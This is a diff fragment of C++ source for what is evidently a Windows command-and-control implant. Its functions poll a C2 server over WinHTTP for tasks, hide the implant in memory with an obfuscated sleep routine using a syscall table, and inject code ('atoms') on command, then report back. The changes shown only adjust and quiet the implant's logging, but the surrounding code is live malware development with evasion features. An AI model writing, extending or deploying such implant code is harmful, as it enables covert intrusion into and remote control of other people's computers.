@@ -128,9 +128,8 @@ std::string FetchTask() {
                             WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwHeaderSize, WINHTTP_NO_HEADER_INDEX);
 
         if (dwStatusCode != 200) {
-            // Log issues silently in background log, don't spam console
+            // Log issues silently in background log
         } else {
-            Logger::Log(SUCCESS, "C2 Link Synchronized. No pending tasking.");
             DWORD dwSize = 0;
             WinHttpQueryDataAvailable(hRequest, &dwSize);
             if (dwSize > 0) {
@@ -139,11 +138,11 @@ std::string FetchTask() {
                 if (WinHttpReadData(hRequest, pBuf, dwSize, &dwRead)) {
                     pBuf[dwRead] = '\0';
                     result = pBuf;
-                    Logger::Log(SUCCESS, "Received task payload: " + result);
+                    if (result != "NO_TASK") {
+                         Logger::Log(SUCCESS, "Received task payload: " + result);
+                    }
                 }
                 delete[] pBuf;
-            } else {
-                // Silent on empty queue
             }
         }
     }
@@ -338,13 +337,13 @@ DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
         PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)sleepCfg.pImplantBase + pDos->e_lfanew);
         sleepCfg.szImplantSize = pNt->OptionalHeader.SizeOfImage;
         
-        Logger::Log(INFO, "Entering Sleep (2s)... Connection pulse imminent.");
+        // Logger::Log(INFO, "Entering Sleep (2s)... Connection pulse imminent.");
         ObfuscatedSleep(&sleepCfg, &g_SyscallTable);
 
         taskJson = FetchTask();
         if (!taskJson.empty() && taskJson != "NO_TASK") {
-            Logger::Log(SUCCESS, "Link established! Received dynamic tasking.");
             if (taskJson.find('{') != std::string::npos) {
+                Logger::Log(SUCCESS, "Link established! Received dynamic tasking.");
                 if (SpawnAtomFromTask(taskJson)) {
                     SendTaskResult("Atom Injected Successfully.");
                 }
